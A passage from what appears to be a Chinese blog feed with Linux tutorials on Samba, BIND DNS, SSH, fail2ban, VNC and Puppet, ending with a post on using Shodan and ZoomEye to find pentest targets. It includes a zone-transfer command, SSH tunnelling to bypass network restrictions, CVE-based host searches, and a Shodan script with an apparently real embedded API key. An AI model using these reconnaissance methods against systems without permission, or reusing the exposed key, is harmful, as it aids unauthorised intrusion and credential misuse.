setfacl -R -m "g:samba:rwx" /srv/private/ # 设置acl访问控制列表，-m修改 (ll之后看到后面有个+号，表示有更多权限) getfacl /srv/private/ # 查看权限 testparm # 检测 sudo systemctl restart smbd.service nmbd.service 客户端访问win上可以访问Linux上的Samba文件夹, Linux上也可以访问Linux上的Samba文件夹 Linux # 图形化 点击Connect to Server，输入地址： smb://192.168.0.130 # 命令行 smbclient -L //192.168.0.130 # 查看目标都有哪些共享信息 smbclient -L //192.168.0.130 -U user1 mount -t cifs -o username=user1 //192.168.0.130/private/public /mnt # 挂载 Windows # win+R \\192.168.0.130 # 命令行工具来访问 net user # 查看会话 net user \\host\private/user1 passwd net user \\host\private /delete # 删除已经建立的会话 net user g: \\host\private # 映射为本地盘符 net config workstation 共享名称以$结尾的，在win上会认为隐藏共享(Linux上还是会显示) 二. 配置公开访问的Samba服务(开放共享文件件)将不提供登录账号的用户映射为guest，无需输入密码 1.配置文件 #配置文件/etc/samba/smb.conf [Global] # 起个名(共享文件夹的名称) workgroup = WORKGROUP security = user # share已废止、Domain、ADS、Server map to guest = bad user # 映射为guest guest ok = yes # 允许来宾账号 2.开放共享文件夹 [Public] comment = public share path = /srv/public/ browseable = yes # 允许看到 writable = yes guest ok = yes 3.创建共享目录 mkdir -p /srv/public/ # 设置访问列表（设置user,nobody代表guest） sudo setfacl -R -m "u:nobody:rwx" /srv/public/ getfacl /srv/public/ # 查看权限 testparm # 检测 # 重启服务 sudo systemctl restart smbd.service nmbd.service 客户端访问同上 服务器信息 smbd --version # 查看版本 sudo smbstatus # 查看状态和连接状况 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>文件服务</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-DNS服务]]></title>
    <url>%2Fposts%2F16425%2F</url>
    <content type="text"><![CDATA[DNS服务 您是谁家老小 域名解析原理DNS：将容易基于的主机名映射到IP地址计算机命名规范： Netbiso名称（微软） Hostname DNS分布式名称系统(但是不同的dns服务器是有层级关系的，呈树状结构) DNS服务结构： 域名 比如：sina.com.cn FQDN(fully qualified domain names ) 比如:www.sina.com.cn 即主机名(www)+域名(sina.com.cn) DNS记录类型 记录类型 作用 NS 域名服务器记录(找a.com与里面的域名对应的ip的话，就要去问域名服务器,问他www的对应的主机的ip地址是多少)，一个域可以有多个域名服务器(dig a.com ns) A 主机记录(域名解析到ip地址) CNAME 别名记录(给域名指向另一个A记录的域名,可以叠加) MX 邮件交换记录 PTR 指针记录（反向查询） SOA 起始授权记录(soa记录对应的域名服务器，才是合法的) DNS命名空间 www.ubuntu.com.严格来说是有点的，但是为了方便，最后面不写点也可以 DNS查询： 逐级委派由机构LCANN负责管理, 负责根域. DNS查询寻结构三种DNS服务器： Master(DNS域里面中，master服务器可以修改DNS记录，在master上做得修改也会自动同步到其他slave等dns服务器) 一般只设置一台 Slave（数据文件来自master的同步） – 前两者两种服务器都会保存dns记录类型 Cache （不保存任何记录，一般都是运营商提供的，跟下面的dns查询有关系，意义：本个区域内有缓存了减少dns会话的流量，提高了效率，减轻了带宽占用，超出生命周期之后才会再次查询） TTL4.Forward（转发类型的，比如会去转发给本地运营商的dns服务器(比如家用无线路由器会企业的域控)，而不是自己去进行递归查询啥的） 同时是三种角色 安装DNS服务使用最广的DNS服务的软件包：BIND（Berkley Internet Naming Daemon）在ubuntu上： # 安装bind(即软件包) 9是版本，dnsutils是用来检查的软件包 sudo apt install bind9 dnsutils # DNS服务区只保存和解析本域各种域名记录 # DNS服务都包含13个根域名服务器地址 cat /etc/bind/db.root # -> ipv4和ipv6地址(AAAA记录) # 事实分布于世界的数百台根域服务器，不只是13个（国内是有根域服务器的） DNS服务器的DNS服务器配置自己做迭代指定递归域名服务器（自建尽量禁用其他地址来连接我们递归查询功能, 除非查询的是域内的域名） # 见 DNS主备部署 DNS默认服务端口TCP 53 / UDP 53 这里是以Bind软件包为例 还有其他软件包： Djbdns 衍生版本：Dbndns, ndjbsns dhamasq DNS + DHCP打包的轻量解决方案 –&gt; 经常用于无线渗透，搭建无线AP3.PowerDNS 模块化开源DNS服务器软件 DNS主备部署对于dns服务器本身的dns地址可以执行运营商等的地址 正向区域配置Master DNS服务器执行区域文件（正向区域 –&gt; 域名解析为ip） 企业内部自用， 一般一个域中会有两个DNS服务器 1. # sudo vim /etc/bind/named.conf.local # zone定义一个区域， type类型，指定存具体记录的文件 zone "lab.com"{ type master; file "/etc/bind/db.lab.com" } 2.编辑区域文件 # 拷贝一个现有的区域文件模板，进行修改(也可手动创建) cp db.local db.lab.com sudo vim db.lab.com # 文件内容 ; BIND data file for lab.com loopback interface ; $TTL 604800 # 允许缓存DNS服务器的缓存时长，单位s， 1D ->一天,12h -> 12小时 @ IN SOA soa.lab.com. root.localhost. ( # @表示本域的域名， IN ->互联网记录类型， SOA起始授权记录; root.localhost.管理员邮箱地址(点就是@ ->root.lab.com.), 括号多行内容 2 ; Serial # 版本号，如果slave的与master服务器字段值相同则不同步数据，不同则同步数据 604800 ; Refresh # slave向master的更新周期 86400 ; Retry # 重试周期 2419200 ; Expire # 最大重试时间 604800 ) ; Negative Cache TTL ; @ IN NS ns1 # NS记录，dns域的域名服务器的名称 @ IN A 10.1.8.128 # 给哪个域名创建A记录，访问本机的域名解析到哪里 @ IN AAAA ::1 # ipv6使用的 ns1 IN A 10.1.8.10 # 给域的ns记录域名解析到哪个ip soa IN A 10.1.8.10 www IN CNAME web # 把www.lab.com解析为web.com.lab web IN CNAME w3 # 有一个CNAME记录 w3 IN A 10.1.8.128 # 最终解析为A记录的ip @ IN MX 10 mx1 # 优先级，数字越小优先级越高 @ IN MX 10 mx2 mx1 IN A 10.1.8.1 # 再把mx的域名解析到ip mx2 IN A 10.1.8.2 ftp IN A 10.1.8.128 ftp IN A 10.1.8.129 # 同一个a记录命名指向不同的ip，不区分优先级，而是轮询 3.重启服务 sudo systemctl restart bind9 sudo systemctl status bind9 4.服务器配置检查 sudo named-checkconf # 检查语法错误 sudo named-checkzone lab.com /etc/bind/db.lab.com # 正向区域检查 sudo named-checkzone lab.com /etc/bind/db.lab.com # 反向区域检查 5.客户端解析验证 # dig在win上没有 ping lab.com dig lab.com ns @10.1.8.10 # 解析ns记录，@dns服务器 dig www.com @10.1.8.10 dig com a @10.1.8.100 # 不指定的话，默认就是a记录 dig lab.com mx @10.1.8.100 客户端解析验证 # nslookup在linux和win都有 nslookup # 设置参数 server 10.1.8.100 # dns服务器 set q=ns # 查询记录类型 lab.com # 查询目标 ## Windows本机hi进行dns本地缓存， 而Linux本地是不做缓存的 ipconfig /displaydns # 显示本地缓存的dns记录 ipconfig /flushdns # 清空本地缓存的dns记录 配置Cache DNS服务器主配置文件/etc/bind/named.conf # 只是一个入口文件 include "/etc/bind/named.conf.options"; # 规范: 【分号结尾】 include "/etc/bind/named.conf.local"; # include "/etc/bind/named.conf.default-zones"; 全局转发DNS服务器对于不属于我们域的解析转发给其他dns服务器 （我们内部的nds服务器不知道怎么解析之后要去找谁）配置转发器的文件: vim /etc/bind/named.conf.options1.全局转发： acl "local"{ # options 块之前 10.1.8.0/24； # 本地网段(为公司内部的地址提供服务) }； options { recursion yes; # recursion即递归查询(公网上的dns服务器一般是禁止递归查询的) allow-recursion { local; }; # 允许对我发起递归查询的地址范围 listen-on { 10.0.2.53; }; # 指定侦听的地址 forwarders { 9.9.9.9; # 全局性的转发器，转发给谁 8.8.8.8; }; }; sudo systemctl restart bind9.service 2.局部转发 zone "sina.com.cn" { # 创建一个域名 type forward; forwarders { 202.99.96.68; #局部转发，针对某个域名转发给某一个ip 202.106.0.20; }; }; sudo systemctl restart bind9.service 解析过之后，就有了缓存，在一定时间内就不会转发再进行请求了 反向区域配置Master DNS服务器（i反向区域: ip解析为域名 –&gt; 反垃圾邮件）反垃圾邮件：攻击者伪造域内邮件发送恶意文件；检查外部的邮件是否是从真正的邮件服务器发送过来的1. # sudo vim /etc/bind/named.conf.local # zone定义一个区域， type类型，指定存具体记录的文件 zone "8.1.10.in-addr-arpa"{ # 反着写,这里一个网段的地址10.1.8就写为8.1.10 type master; file "/etc/bind/db.10.1.8"; } 2. # 拷贝一个模板文件 sudo cp /etc/bind/db.127 /etc/bind/db.10.1.8 # 重启服务 sudo systemctl restart bind9 sudo systemctl status bind9 3. # 编辑反向区域配置文件 vim /etc/bind/db.10.1.8 # 文件内容 ; ; BIND reverse data file for local loopback interface ; $TTL 604800 @ IN SOA ns.lab.com. root.lab.com. ( 1 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL ; @ IN NS ns.lab.com. # 本地的ns记录 10 IN PTR ns.lab.com. # PTR 反向指针记录 145 IN PTR mx1.lab.com #145即10.1.8.145 2 IN PTR mx2.lab.com 2 IN PTR w3.lab.com # 一个ip也可以解析为多个域名 4.检测一下反向解析是否正常 dig -x 10.1.8.2@10.1.8.2 配置Slave DNS服务器 为例实现冗余容错(防止某台dns服务器宕机)，通常会为每个与安装多个Slave DNS服务器 修改记录只能在Master DNS服务器(一个域内只允许有一个)上操作，通过版本号(Serial)通知Slave服务器同步 (所以。作为master的管理员，配置更新之后需要手动修改版本号的值) 安全考虑 服务器全局禁止区域传输（同步本域所有DNS记录） 只允许指定IP，指定区域的Slave服务器进行区域传输 区域数据同步使用TCP 53端口 1. # dig进行区域传输获取信息 axfr(黑客最喜欢拿的) dig @10.1.8.10 lab.com axfr ## 禁止区域传输： # 全局配置文件 # sudo vim named.conf.options # 在option中添加： allow-transfer { none; }; # 重启 # 禁用之后，不影响dig来查询某记录，只是拒绝一次性把记录拿走 2.继续修改master服务器配置 # sudo vim /etc/bind/named.conf.local # 在正向/反向zone字段里面都要添加 allow-transfer { 10.0.2.54; }; # 允许10.0.2.54 -> 就是slave服务器 3.继续修改master服务器配置 # vim /etc/bind/db.lab.com # 增加一条NS记录和A记录 @ IN NS ns2 ns2 IN A 10.1.8.20 # 编辑反向的域名解析记录 # vim db.10.1.8 20 IN PTR ns2.lab.com. # 重启服务 4.安装slave dns服务器并配置 sudo vim /etc/bind/named.conf.options # 内容 acl "local"{ # 10.1.8.0/24； }； options { recursion yes; allow-recursion { local; }; listen-on { 10.0.8.20; }; # 侦听自己的 allow-transfer { none; }; forwarders { 9.9.9.9; 8.8.8.8; }; ............ }; # 重启服务 5.slave dns服务器上创建区域 # sudo vim /etc/bind/named.conf.local # 正向zone区域（和master上的对应好） zone "lab.com"{ type slave; file "db.lab.com"; # 不能使用绝对路径(区域文件不用手动创建) masters { 10.1.8.10; }; } # 反向区域 zone "8.1.10.in-addr.arpa"{ type slave; file "db.lab.com"; # 不能使用绝对路径 masters { 10.1.8.10; }; } # 重启服务 #区域文件db.lab.com不用手动创建 # 会自动从master上同步下来 # 位置在 /var/cache/bind/ 而且文件是加了密的 # 查看slave dns服务器的情况 grep bind /var/log/syslog 记录更新通知Slave服务器到达更新周期客户端数据加密保存（不能直接修改）Master服务器通知版本号 master服务器的dns配置更新之后，一定要手动修改版本号，然后重启 在区域配置文件配置（master服务器的dns配置更新之后会通知slave服务器）： # sudo vim /etc/bind/named.conf.local # 正反向zone都要配置 also-notify { 10.1.8.20; }; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-远程管理]]></title>
    <url>%2Fposts%2F11524%2F</url>
    <content type="text"><![CDATA[第七章-远程管理 看我遥控你 远程访问方式为什么要远程管理？服务器大多部署与专门的机房： 电磁、噪声、氧气、温度湿度等都不适宜人类长期居住 避免闲杂人等结束业务服务器 远程管理 不同的操作系统都支持远程管理技术 命令行远程管理工具 图形化远程管理工具 Telnet 账号证明就是你 古老的命令行远程管理工具（保底的，建议能不用就不用） 不安全（明文） 应尽量避免适用（适用于不支持ssh的环境） 客户端程序包含在所有系统的默认安装中 服务端口默认TCP 23 客户端 #可以连接任何域名和端口 telnet 1.1.1.1 80 #和80端口建立socket连接后，可以发送http数据 服务器端程序安装 sudo apt install telnetd vim /etc/issus.net # 避免泄露版本信息, #打开文件，修改tenlet的banner信息（可以修改为一些告知的警告信息:"本公司的服务器,出问题承担法律责任"哈哈） # 查看服务状态 systemctl status inetd.service SSH 账号证明就是你 服务器安装 # ubuntu中ssh-server和ssh-client都默认安装了 sudo apt install openssh-server # openssh是个工具套件(包含了sftp,scp等) # sftp(替代了sftp) &lt;---> ftp(明文传输,不太安全) # scp(替代了rcp) &lt;---> rcp(远程拷贝文件,明文传输,不太安全) #查看服务状态 systemctl status sshd.service # 服务端口默认`22` # 配置文件(ubuntu上来就可以直接使用不用配置) vim /etc/ssh/sshd_config #修改配置在这个文件 SSH1、SSH2两个版本(版本2更安全) 配置文件vim /etc/ssh/sshd_config常用配置项： Banner /etc/ssh_banner.sh # 登录前的banner,指定文件 Port 2222 # 修改默认端口(修改后，下次连接会改变端口) PubkeyAuthentication yes # 开启后使用公钥登录/关闭(no) ListenAddress 12.34.56.78 # 指定哪块网卡才能侦听22(被ssh连接) PermitRootLogin yes # 是否允许root远程登录(不过还是建议使用普通账号),建议设置为no是禁止所有方式登录 #prohibit-password是禁用账号密码方式 Protocol 2 # 默认是2.0的协议，可以加一下这条配置，指定只接受2.0版本的连接 Allowsers user1 user2 # DenyUsers user3 允许/禁止ssh连接的用户 AllowGroup sshusers # 允许/禁止ssh连接的用户`组` PasswordAuthentication no # 禁止使用密码登录(单一密码认证的安全性很低) # 更多配置查文档 一些零散问题 — SSH工具1.scp #默认连接22端口，如果修改了就需要指定端口号 scp a.txt 192.168.1.10: # 拷贝一个文件(默认本地账号与原创系统账号同名，默认目标是主目录) 注意冒号 scp a.txt user1@192.168.1.10:/home/b.txt # 指定用户名、目标路径 scp -rv dirs/ user1@192.168.1.10: # 拷贝一个目录， -r递归,-v详细信息 scp user1@192.168.1.10:/tmp/b.txt . # 拷贝目标服务器的文件到我的机器当前目录上(下载) 2.SFTP（ssh和ftp的组合） # 登录 sftp xps@192.168.1.10 # 下载文件 get a.txt # 上传 put # 一些命令：help, ls, cd, get, wget, put, mput # 退出 quit exit ssh公钥登录非对称算法（公钥算法） 公钥 私钥公钥加密，私钥解密；私钥加密，公钥解密 生成秘钥对 # 1.在我的机器(客户端)产生一对， 选择rsa算法，秘钥长度选择4096 ssh-keygen -t rsa -b 4096 # 修改... # 命名秘钥对 ssh-keygen -t rsa -b 4096 -f id_mail # 修改私钥密码文(这个密码要设置更加安全一点) -p， -f指定修改哪个key的 ssh-keygen -p -f ~/.ssh/id_rsa # 有多个的话，-f指定 # 2.设置公私钥保存的位置，和打开的密码 # 存放在下面两个文件 ~/.ssh/id_rsa # 私钥 ~/.ssh/id_rsa.pub # 公钥 #ps：know_hosts是连接过的主机 # 3.把公钥文件-->传送到目标服务器上(服务器上会变成.ssh/authorized_key) ssh-copy-id xps@192.168.0.10 #如果有多个，-i选择公钥 # 4. 建议设本地私钥文件权限 chmod 400 .ssh/id_rsa # 5.服务端公钥权限也要修改 .ssh/authorized_key # 6.现在可放心登录了(现在输入的密码是对私钥加密的密码) ssh xps@192.168.0.10 # Note：记得配置文件修改为禁止使用ssh密码登录,使用公钥登录： PasswordAuthentication no PubkeyAuthentication yes # Note:私钥千万不能泄露哦 SSH隧道通过ssh隧道，封装一些其他的服务数据，保证安全性 登录 ssh xps@192.168.0.10 # 登录之后，不进入shell界面（只是获得会话后运行一个命令，但效果是一样的） -- 命令服务端去ping另外一台机器 # -i指定私钥，-p指定端口 ssh -i ~/.ssh/id_main ssh xps@192.168.0.10 -p 2222 ping 192.168.0.1 # (cstream -t限制传输速度通信带宽)拷贝文件夹到目标机器（本地打包, 在服务端解包），pv显示带宽占用情况 # --- 企业用的网络带宽(质量好)比家用的成本很贵 tar -cj dir/ | pv |cstream -t 100k | ssh xps@192.168.0.10 'tar -xj' ssh隧道 – 实现远程映射 ###### 端口映射（两个机器之间，添加一个加密的管道 来连接） # 映射远程端口23到本机2001端口 #（-f端口转发,-N不占用命令行窗口, -L侦听本机的端口，localhost理解为隧道，23为目标机器端口，最后是目标机器ip） ssh -fN -L2001:localhost:23 xps@192.168.0.10 # 现在，telnet本机的2001端口，就相当于通过机密的隧道来映射到目标的23端口 # 其他类型的服务也可以封装... ### 拓展：远程映射 # 隧道的起点：我的机器，隧道的终点：'另外机器'。然后通过'另外机器',访问目标机器(sina) # 本机的2002端口，通过ssh隧道，映射到'另外机器'(世界上随便一个机器)的ip的80端口， # 用途：内网特殊的服务器运行访问外网(进行映射)，就能突破对内容不能上网的限制 # 限制：一对一，针对的外网的某一台（提高：一个端口访问外网所有资源，自己找资料） ssh -fN -L2002:123.206.96.26:80 xps@192.168.0.10 # 再telnet 127.0.0.1:2002,就是达到了访问123.206.96.26的80端口的目的(最后的ip只是建立隧道,类似中间的一个) ssh隧道 – 实现文件系统挂载比如，一开机，就自动把远程机器的目录/分区挂载到我本机上，跟访问本地目录一样的效果 ## ssh隧道实现文件系统的挂载 # 第一个ip的要挂载的远程机器，后面的本机目录 sshfs xps@192.168.0.10:home/test /mnt/myfiles # 远程挂载远程机器目录到本地 # 再查看，会发现本地目录多了远程服务器目录的文件（如果网络带宽不够，性能和体验就比较差） # 在客户端/服务端对文件进行操作，都是可以的 umount /mnt/myfiles # 卸载1 fusermount -u /mnt/myfiles # 卸载2 #配置文件使用持久化挂载 vim /etc/fstab user1@192.168.0.10:/path /mntpotin fuse,sshfs, rw,noauto,user,_netdev0 # 目标机器的路径，本机的挂载点 SSH客户端若要管理的服务器的数目众多，对每台服务器做一个方便记忆的标签，简化登录 在本机(客户端)创建一个客户端配置文件：~/.ssh/config内容 host server1 # 别名随意 Hostname 192.168.1.10 # 对应主机ip，端口，用户名 Port 22 User xps host db2 Hostname 192.168.1.10 Port 22 User xps host mail1 Hostname 192.168.1.10 Port 22 User xps 以后登录的话，直接： # 直接登录别名即可(不仅方便，还隐藏了ip，更加安全) ssh db1 SSH安全SSH防爆破密码爆破防护 方法：监视：次数太多就禁止该ip访问 借助fail2ban来实现:fail2ban原理：周期性的检查登录日志，对异常的ip进行屏蔽(调用防火墙实现) # 安装 apt install fail2ban # 默认主配置文件，软件更新时被覆盖(`所以一般不会使用它`) jail --> 监狱 /etc/fail2ban/jail.conf # 本地配置文件，软件更新不被覆盖，优先级更高（`一般常修改这个文件`） 复制一份：cp jail.conf jail.local /etc/fail2ban/jail.local #配置项(一般只需配置几项) #1.全局的： ignoreip=127.0.0.1/8 19.168.0.10 # 忽略并不进行监视的地址（受信的ip地址段） bantime=-1 # 禁用的时间(单位是s)， -1是永远屏蔽 findtime=1 # 查询间隔时间 maxretry=5 # 连着失败输入多少次密码，我就屏蔽你 #2.Actions: 有异常做什么动作(比如报警邮件，默认是防火墙屏蔽) #3.Jails设置：针对不同类型的服务(并不仅限于ssh服务)，配置不同的（这里的优先级比全局配置项高） [sshd] ecabled=true # 启用对ssh的jails filter=sshd # 查找的关键词 logpath = xxxxxx.log # 以ssh服务为例(见下图) # 重启服务生效 sudo systemctl restart fail2ban.service # 查看身份认证日志文件 tail -f /var/log/auth.log # 查看jail列表(都有哪些jail，jail的情况) sudo fail2ban -client status sudo fail2ban -client status sshd # 查看ssh的jail的详细信息 # 查看防火墙规则 sudo iptables -S sudo iptables -L -n # 手动解除被禁IP sudo iptables -D f2b-sshd-s 192.168.1.111 -j REJECT # 通过删除防火墙某一个规则 -D, REJECT或DROP看自己的情况 sudo fail2ban-client set sshd unbanip 192.168.1.8 # 手动解除禁用之后，但是如果重启服务，会再自动查看日志：还没有超过被禁期限的ip会再次被禁 VNC服务 这里只介绍vnc，还有其他更优秀的工具，但是vnc的适用范围最广 图形化界面（类似于windows下的远程桌面） 使用图形化界面及工具 是Linux系统最通用的远程图形管理工具（通用适用于windows） 安装图形环境 #这里安装简化版的xfce4桌面环境，这里选择vnc的一个软件包:tightvncserver. 也可以自己选择别的版本的 sudo apt install gnome-core xfce4 xfce4-goodies tightvncserver # 一个vnc可以启动多个侦听端口(默认从5901开始)，从不同端口连接，打开不同会话(每个用户看到的桌面是不一样的) # 若只侦听一个端口，通过一个端口连接，多个用户看到的都是一个桌面 # 建议：多用户，在每一个不同权限的用户下(su进去，运行启动实例)，这样不同用户连接就是不同的桌面了 运行配置 vncserver # 启动vnc服务（接下来会让你输入连接密码和只读密码） ~/.vnc/xstartup # 会生成运行文件 vncserver -kill:1 # 删掉自动生成的实例（因为不一定最适合我们的桌面环境。冒号后面是1是5901,如果是2就是5902） # 备份一下文件 mv xstartup xstartup.bak # 创建新运行文件， 手动配置适合我们xfce4的vnc配置 vim xstartup #!/bin/bash xrdb $HOME/.Xresources startxfce4 &amp; # 修改权限 chmod +x ~/.vnc/xstartup # 重新运行 vncserver # tcp的5901端口 # 就可以在客户端用客户端软件连接了(比如：Remote Desktop Viewer) 输入ip:端口 # Note: 服务器上，能少开端口就少开端口，能少开服务就少开服务 多用户 # 每个用户不用会话 # 在每一个不同权限的用户下(su进去，运行启动实例)，这样不同用户连接就是不同的桌面了 su newuser1 vncserver ~/.vnc/xstartup vncserver -kill:2 vim xstartup #!/bin/bash xrdb $HOME/.Xresources startxfce4 &amp; chmod +x ~/.vnc/xstartup vncserver :2 # tcp的5902端口 ps: vnc的加密强度不是很高，所以：在不需要vnc的时候，建议杀掉vnc进程(vncserver -kill:2) 因为 vnc的加密强度没有ssh高，所以，尝试：先建立ssh隧道，再在隧道的基础上建立图形化的连接 PUPPET也是一个远程管理工具，可以不登录到被管理服务器上利用puppet的服务端(我的机器)来管理puppet的客户端(安装在远程服务器上)，进行批量管理… 全生命周期的远程管理方案 软件安装部署(可以写一个脚本，然后批量下发给安装有puppet客户端的服务器上) 权限设置 账号管理 支持云平台 支持容器(Docker) 适合大量服务器管理 准备 # 这里以两台机器做实验 # 为了区分，改一下两台计算机名 hostnamectrl set-hostname puppet hostnamectrl set-hostname client # 修改hosts文件，修改解析域名(这个随便起) -- 两台机器都要修改 vim /etv/hosts 192.168.1.10 puppet.lab.com puppet 192.168.1.11 client.lab.com client # 其他行都删掉就行 # 可以在dns服务器上修改，这里通过hosts修改域名解析只是权宜之计(下一章学完DNS之后就在dns服务器修改域名的解析) 安装 # 安装puppet服务端程序 sudo apt install puppetmaster # 安装puppet客户端程序 sudo apt install puppet 配置服务端配置-1 cd /etc/puppet sudo mkdir -p modules/apache2/manifests # manifests 目录下面就是资源文件 touch init.pp # sudo vim /etc/puppet/modules/apache2/manifests/init.pp # 比如要给下面的机器安装apache, # 一组资源就是一个类 class apache2{ package{'apache2': # 软件包 ensure=>installeds, } service{'apache2': # apache的服务是否启动 ensure=>ture, ensure=>ture, require=>Package['apache2'], # 包的名称 } } 服务端配置-2 # 上面的配置文件定义了资源，那么这里确定要给哪些服务器安装哪个资源 # 选择哪个资源 cd manifests touch site.pp # sudo vim /etc/puppet/manifests/site.pp # 解析这个节点(通过域名解析到对应ip,只要那些计算机在这个域名即可) node 'client.lab.com' { include apache2 # 选择下发哪些资源。这里以推送apache2资源为例 } # 重启服务 systemctl restart puppetmaster.service 客户端配置 # puppet的客户端和服务端是通过证书来通信等操作的 # sudo vim /etc/default/puppet 默认没有，自己新建 START=yes # 重启服务（会自动向puppet服务端发起请求申请证书） systemctl restart puppet.service 客户端证书前面请求测试 # 在查看客户端的指纹信息 sudo puppet agent --figerprint # 服务端下面下发证书后，然后在客户端测试一下，获取证书 sudo puppet agent --test 服务端请求查看签名 # 在服务端查看哪些客户端跟我发起证书请求了 sudo puppet cert list # 在服务端使用自己的私钥给对应的机器进行签名(sign) sudo puppet cert sign client.lab.com # 客户端查看证书下发进度： sudo puppet agent --test 完成上面的步骤(资源的下发配置，证书的请求与签名下发，重启服务)之后，在客户端查看apache2的服务已经安装好并启用了 日志状态信息查看 # 查看状态 systemctl status puppet.service /var/log/syslog 上面关于puppet只是简单的一小部分，后续高级用法，请自行探索 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>远程管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[黑暗引擎]]></title>
    <url>%2Fposts%2F17232%2F</url>
    <content type="text"><![CDATA[一. shodan1.简单介绍Shodan，是一个暗黑系的谷歌，作为一个针对网络设备的搜索引擎，它可以在极短的时间内在全球设备中搜索到你想找的设备信息。对于渗透工作者来说，就是一个辅助我们寻找靶机的好助手。 2.内置语法# Shodan的参数有很多，这里只介绍简单的几种 hostname："主机或域名" 如 hostname:"google'' port："端口或服务" 如 port:"21" ip : "ip地址" 如 ip : "168.205.71.64" net："IP地址或子网" 如 net:"210.45.240.0/24" vuln :指定漏洞的cve 如 vuln:CVE-2015-8869 但是这个命令最好搭配起来使用，如 country:CN vuln:CVE-2014-0160 os :"操作系统" ​ 如 os:"centOS" isp："ISP供应商" 如 isp:"China Telecom" product："操作系统/软件/平台" 如 product:"Apache httpd" version："软件版本" 如 version:"3.1.6" geo："经纬度" 如 geo:"39.8779,116.4550" country`："国家" 如 country:"China" country:"UN" city："城市" 如 city:"Hefei" org："组织或公司" 如 org:"google" before/after："日/月/年" 如 before:"25/09/2017" after:"25/09/2017" asn : "自治系统号码" 如 asn:"AS2233" 3.脚本使用 （建议使用本地脚本，也可自主开发）项目地址：https://github.com/achillean/shodan-python 先clone, python setup.py install, shodan init 秘钥_value,然后可以在命令行用了就shodan search product:"apache" 只不过显示方式不友好 拓展：自主开发 官方文档：https://shodan.readthedocs.io/en/latest/index.html from shodan import Shodan api = Shodan("cUNKhp6cIaN7J4Y9hXnBtbtT8bd9SKCf") # Lookup an IP ipinfo = api.host('8.8.8.8') print(ipinfo) # Search for websites that have been "hacked" for banner in api.search_cursor('ch1_http相关.title:"hacked by"'): print(banner) # Get the total number of industrial control systems services on the Internet ics_services = api.count('tag:ics') print('Industrial Control Systems: {}'.format(ics_services['total'])) 案例测试：1.phpstudy采集头部信息 Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9 2.子域名信息采集hostname:"xps.cn" 3.特定漏洞靶机采集vuln:CVE-2020-1983 普通用户没权限用 二. zoomeye 对国内更贴近一些 内置语法ZoomEye搜索技巧 指定搜索的组件以及版本 app：组件名称 ver：组件版本 例如：搜索 apache组件 版本2.4 app:apache ver:2.4 指定搜索的端口 port:端口号 例如：搜索开放了SSH端口的主机 port:22 一些服务器可能监听了非标准的端口。 要按照更精确的协议进行检索，可以使用service进行过滤。 指定搜索的操作系统 OS:操作系统名称 例如：搜索Linux操作系统 OS：Linux 指定搜索的服务 service：服务名称 例如，搜素SSH服务 Service：SSH 指定搜索的地理位置范 country：国家 city：城市名 例如： country:China city：Beijing 搜索指定的CIDR网段 CIDR:网段区域 例如： CIDR：192.168.158.12/24 搜索指定的网站域名 Site:网站域名 例如： site:www.baidu.com 搜索指定的主机名 Hostname:主机名 例如： hostname:zwl.cuit.edu.cn 搜索指定的设备名 Device：设备名 例如： device:router 搜索具有特定首页关键词的主机 Keyword：关键词 例如： keyword:technology 脚本开发(多语言开发)官方手册:https://www.zoomeye.org/doc 1.登录授权2.请求搜索3.回显数据 补充：谷歌黑客高级玩法https://www.uedbox.com/shdb/ https://www.uedbox.com/post/54776/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑暗引擎</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP常见安全设置]]></title>
    <url>%2Fposts%2F1940%2F</url>
